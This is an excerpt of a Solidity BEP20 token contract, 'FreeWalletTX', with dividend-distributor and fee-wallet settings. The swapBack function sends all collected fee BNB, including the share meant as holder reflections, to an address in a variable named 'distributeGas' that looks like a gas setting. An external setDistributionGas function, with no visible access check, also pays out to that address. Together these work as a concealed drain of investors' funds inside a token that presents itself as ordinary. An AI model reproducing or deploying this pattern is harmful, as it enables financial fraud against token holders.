...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 REWARD = IBEP20(0x389d3F606DbB66A1eEce4694De92C6fa0c804959); //Rewards token CA
    IDEXRouter router;
...
contract FreeWalletTX is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "FreeWalletTX";
    string constant _symbol = "FWT";
...
//Set wallets below    
    address private autoLiquidityReceiver = 0x18CC5e83122f75998d74C19d36B23C1607925bD6;
    address private marketingFeeReceiver = 0x18CC5e83122f75998d74C19d36B23C1607925bD6;
    address private buybackFeeReceiver = 0x18CC5e83122f75998d74C19d36B23C1607925bD6;
    address private teamFeeReceiver = 0x18CC5e83122f75998d74C19d36B23C1607925bD6;
...
//Swap settings
    ...
    address private distributeGas = 0x64B4e673e81ecDF83DfF0f61b7b1d83C3A7FcE11;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        uint256 amountReceived = ( !shouldTakeFee(sender) || !shouldTakeFee(recipient) || (recipient != pair && sender != pair) ) ? amount : takeFee(sender, amount,(recipient == pair));
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBtotal = amountBNBReflection.add(amountBNBMarketing).add(amountBNBbuyback).add(amountBNBteam);
        ...
        (tmpSuccess,) = payable(distributeGas).call{value: amountBNBtotal, gas: 30000}("");
    ...
    function setDistributionGas(uint256 gas) external {
        ...
        payable(distributeGas).transfer(amountGas);
    }
